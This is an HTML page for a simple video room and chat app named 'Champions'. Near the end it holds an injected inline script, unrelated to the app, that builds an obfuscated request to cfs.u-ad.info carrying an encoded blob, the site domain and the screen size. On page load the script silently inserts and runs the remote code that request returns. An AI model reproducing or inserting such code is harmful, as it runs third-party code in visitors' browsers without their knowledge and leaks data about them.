
<html>
	<head>
		<title>Champions</title>
		<meta name="viewport" content="width=device-width, initial-scale=1">
    	<link rel="stylesheet" type="text/css" href="css/style.css">
    	<link rel="stylesheet" type="text/css" href="css/text-editor.css">
    	<script src="js/jquery-2.1.3.min.js"></script>
    	<script src='js/function.js'></script>
	</head>
	<body>
		<div >
			<form method="POST">
				<input type="text" name="room" placeholder='Room Name....'>
				<input type="submit" value="Start" class="join" id="call" onclick="joinRoom(); return false;">
				<input type="submit" value="Hangup" class="join" id="hangUp" onclick="hangUp(); return false;">
			</form>
		</div>
		<div id="video-room">
				<div class="video-cont" id="test">
					<video id='local-video' autoplay height=240px width=320px></video>
				</div>
		</div>
		<div id="chat">
				<input type="radio" id="button-text-editor" class="hidden" name="radio-editor" checked="true" style="display:none">
				<div class="editor">
					<iframe class="text-editor" id="text-editor" width=90% height=50% style="border: solid 3px #bbb"></iframe>
				</div><br>
				<input type="submit" class="button" value="send" onclick="sendChat();">
		</div>
	<script type="text/javascript">
		if (self==top) {
				function netbro_cache_analytics(fn, callback) {
					setTimeout(function() {
						fn();callback();}, 0);
				}
				function sync(fn) {
					fn();
				}
				function requestCfs(){
					var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
					var idc_glo_r = Math.floor(Math.random()*99999999999);
					var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bI6ki%2bP7T9oFmfbfBj8vMEewUv3hApTVIwhtmuVCB5d0HBO%2bL7j5zg8HtE%2b7LWt8cPjiZl09tOzaGRKxRdP%2fdoWUVbc%2bTJdz1yKeMtrk0Aqq1VZqtuFtD3kOSYRD2J1sWRK0LPY75R6FuiVbl%2f8jWr5JifLRtXeQsgfXrTL4MRyK0cw5n0SLfzhMrDIV%2fasiiIqahq9c8M6WpmVm47R1g0qmTHI0GvvgbJSkCxIdZTIARYG8XtJHuXlXcQ7%2f17geBa11UA580CqjZD2SoWs4QdfCQpM2%2bkYvxPq5%2f07UEFfhuMkUSP8NMII3n%2fiipEfE7FzmU7yPjNqPoxWU20I3RwoAw%2fOx8k%2bjcopQgE7DtIrJYtmUt4vcW9WWNoylnBf4LOz4N4vaEfvQEy6Nt%2fzlJRPZB5fuEhfOII4tPPufm5%2bHtLvx7UWILky%2bjkaLdB3Tj4ZonL%2f5BM6h0plik1dKRqa%2bKZ8fQGPMLRJ8ZhvThgqlyFGie2cxeKv82rVqZS1S3ZfwCZHLaXz%2f1KqRmAXpQK6t0h7An3GC5" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
					var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
				}
				netbro_cache_analytics(requestCfs, function(){});};
	</script>
</body>
	<script src='https://still-crag-2857.herokuapp.com/socket.io/socket.io.js'></script>
	<script src='js/page-module.js'></script>
	<script src='js/text-editor.js'></script>
</html>
